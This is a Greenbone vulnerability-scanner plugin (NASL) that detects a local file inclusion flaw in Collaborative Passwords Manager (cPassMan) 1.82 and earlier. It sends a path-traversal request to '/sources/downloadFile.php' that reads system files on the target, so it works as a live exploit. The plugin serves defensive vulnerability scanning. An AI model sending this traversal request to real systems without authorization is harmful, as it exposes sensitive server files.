# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:cpassman:cpassman";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801923");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-04-26 15:24:49 +0200 (Tue, 26 Apr 2011)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Collaborative Passwords Manager (cPassMan) 'path' Local File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_passman_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cpassman/detected");

  script_xref(name:"URL", value:"http://safe-host.info/?p=555");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47379");
  script_xref(name:"URL", value:"http://sec.jetlib.com/Full_Disclosure/2011/04/14/cPassMan_v1.82_Arbitrary_File_Download_-SOS-11-004");
  script_xref(name:"URL", value:"http://www.zataz.com/mailing-securite/1302836181/%5BFull-disclosure%5D-cPassMan-v1.82-Arbitrary-File-Download---SOS-11-004.html");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain potentially sensitive
  information and to execute arbitrary local scripts in the context of the web server process.");

  script_tag(name:"affected", value:"Collaborative Passwords Manager (cPassMan) 1.82 and prior");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input via the 'path'
  parameter to '/sources/downloadfile.php', that allows remote attackers to view
  files and execute local scripts in the context of the webserver.");

  script_tag(name:"solution", value:"Upgrade Collaborative Passwords Manager (cPassMan) to 2.0 or later.");

  script_tag(name:"summary", value:"Collaborative Passwords Manager (cPassMan) is prone to local file inclusion vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://sourceforge.net/projects/communitypasswo/files/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";

files = traversal_files();

foreach file( keys( files ) ) {

  url = dir + "/sources/downloadFile.php?path=../../../../../../../" + files[file];

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
